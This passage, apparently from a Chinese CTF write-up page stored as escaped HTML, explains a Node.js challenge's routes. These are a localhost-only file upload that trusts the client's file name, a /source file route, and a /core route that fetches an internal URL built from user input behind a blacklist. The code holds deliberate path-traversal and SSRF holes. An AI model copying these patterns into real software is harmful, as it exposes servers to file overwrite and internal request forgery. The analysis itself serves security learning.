num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token keyword&#34;&gt;var&lt;/span&gt; file_name &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; req&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;files&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;originalname&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token keyword&#34;&gt;var&lt;/span&gt; dir_file &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; __dirname &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; file_path &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; file_name&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;!&lt;/span&gt;fs&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;existsSync&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;__dirname &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; file_path&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                &lt;span class=&#34;token keyword&#34;&gt;try&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                    fs&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;mkdirSync&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;__dirname &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; file_path&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;catch&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;error&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                    obj&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;msg &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;file type error&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                    res&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;send&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token constant&#34;&gt;JSON&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;stringify&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;obj&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                    &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token keyword&#34;&gt;try&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                fs&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;writeFileSync&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;dir_file&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; data&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;28&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                obj &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt; &lt;span class=&#34;token literal-property property&#34;&gt;msg&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;upload success&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token literal-property property&#34;&gt;filename&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt; file_path &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; file_name &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;29&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;catch&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;error&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;30&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                obj&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;msg &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;upload failed&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;31&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;32&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            res&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;send&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token constant&#34;&gt;JSON&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;stringify&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;obj&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;33&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;34&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;35&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;定义一个 POST 路由（ &lt;code&gt;/file_upload&lt;/code&gt; ），用于处理文件上传。&lt;/p&gt;
&lt;p&gt;检索客户端的 IP 地址。&lt;/p&gt;
&lt;p&gt;检查 IP 地址是否包含 &lt;code&gt;127.0.0.1&lt;/code&gt; 。如果不包含，则阻止请求，仅允许本地主机访问。&lt;/p&gt;
&lt;p&gt;读取上传的文件并根据其 mimetype 进行存储。如果该文件类型的目录不存在，则创建一个。然后将文件写入适当的位置。&lt;/p&gt;
&lt;p&gt;如果在文件读取或写入过程中发生任何错误，则会以 JSON 形式发送相应的错误消息。&lt;/p&gt;
&lt;p&gt;路线三（/source）：&lt;/p&gt;
&lt;figure class=&#34;highlight js&#34;&gt;&lt;figcaption data-lang=&#34;JavaScript&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;app&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;get&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;/source&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token parameter&#34;&gt;req&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; res&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    res&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;sendFile&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;path&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;join&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;__dirname &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;/template/source.txt&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;定义一个路由 (  &lt;code&gt;/source&lt;/code&gt; )，从目录中提供静态文件 (  &lt;code&gt;source.txt&lt;/code&gt; )  &lt;code&gt;/template&lt;/code&gt; 。&lt;/p&gt;
&lt;p&gt;路线四（/core）：&lt;/p&gt;
&lt;figure class=&#34;highlight js&#34;&gt;&lt;figcaption data-lang=&#34;JavaScript&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;app&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;get&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;/core&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token parameter&#34;&gt;req&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; res&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;var&lt;/span&gt; q &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; req&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;query&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;q&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;var&lt;/span&gt; resp &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;q&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;var&lt;/span&gt; url &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;http://localhost:8081/source?&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; q&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        console&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;url&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;var&lt;/span&gt; trigger &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;blacklist&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;url&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;trigger &lt;span class=&#34;token operator&#34;&gt;===&lt;/span&gt; &lt;span class=&#34;token boolean&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            res&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;send&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;error occurs!&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token keyword&#34;&gt;try&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                http&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;get&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;url&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token parameter&#34;&gt;resp&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                    resp&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;setEncoding&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;utf8&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                    resp&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;on&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;error&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token parameter&#34;&gt;err&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                        &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;err&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;code &lt;span class=&#34;token operator&#34;&gt;===&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;ECONNRESET&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                            console&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Timeout occurs&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                            &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                        &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                    resp&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;on&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;data&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token parameter&#34;&gt;chunk&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                        &lt;span class=&#34;token keyword&#34;&gt;try&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                            resps &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; chunk&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;toString&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                            res&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;send&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;resps&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                        &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;catch&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;e&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                            res&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;send&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;e&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;message&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                        &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token 